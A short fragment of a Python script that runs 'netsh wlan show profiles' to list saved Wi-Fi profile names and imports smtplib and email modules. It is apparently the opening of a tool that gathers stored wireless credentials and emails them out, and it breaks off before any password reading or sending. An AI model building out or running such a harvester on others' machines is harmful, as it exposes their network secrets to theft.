import subprocess
import re
import smtplib
from email.message import EmailMessage

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list = list()